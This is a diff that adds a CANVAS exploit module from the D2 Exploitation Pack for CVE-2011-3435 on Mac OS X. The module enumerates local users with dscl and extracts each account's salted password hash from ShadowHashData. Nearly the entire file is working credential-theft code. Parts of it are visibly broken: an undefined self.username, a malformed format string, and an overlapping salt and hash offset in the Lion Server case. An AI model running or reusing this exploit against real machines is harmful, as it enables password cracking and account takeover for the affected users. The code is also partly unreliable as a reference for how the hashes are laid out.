@@ -1,0 +1,86 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+
+if "." not in sys.path: sys.path.append(".")
+
+from canvasexploit import canvasexploit
+import libs.canvasos as canvasos
+import canvasengine
+
+NAME = "d2sec_OSX_CVE-2011-3435"
+VERSION = "0.1"
+DESCRIPTION = "Retrieve local user password hash"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Vendor"] = "Apple"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Date public"] = "2011/10/14"
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2011-3435"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3435"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["MACOSX"] ]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.supportedNodeArgs = ["osxNode"]
+    self.name = NAME
+    self.node = ''
+
+  def get_user_list(self):
+    user_list = self.node.runcommand("dscl . -list /Users")
+    for username in user_list.splitlines():
+      self.get_user_hash(username)
+
+  def get_user_hash(self, username):
+    self.log('[D2] User %s' % username)
+    nfo = self.node.runcommand('dscl localhost -read /Search/Users/%s' % username)
+    nfo = nfo.split("\n")
+    digest = ''
+    for pos,item in enumerate(nfo): # extract digest
+      if "dsAttrTypeNative:ShadowHashData" in item:
+        digest = nfo[pos+1].replace(" ", "")
+    if len(digest) > 261:
+      if len(digest) == 262: # Out of box configuration
+        salt = digest[56:64]
+        hash = digest[64:192]
+      elif len(digest) == 314: # SMB turned on
+        salt = digest[104:112]
+        hash = digest[112:240]
+      elif len(digest) == 1436: # Lion Server
+        salt = digest[176:184]
+        hash = digest[176:304]
+      elif len(digest) == 1492: # Lion Server with SMB
+        salt = digest[224:232]
+        hash = digest[232:360]
+      self.log('[D2] %' % '='*(len(self.username)+10))
+      self.log('[D2] salt : %s' % salt)
+      self.log('[D2] hash : %s' % hash)
+      self.log("\n\n")
+
+  def run(self):
+    self.setInfo('[D2] %s (in progress)' % NAME)
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log('[D2] %s node type not supported'%type)
+        continue
+      self.node = node
+      self.get_user_list()
+    self.setInfo('[D2] %s - done (success)'%NAME)
+    return 1
+	
+if __name__=="__main__":
+  print "This module is meant to be run only within CANVAS"
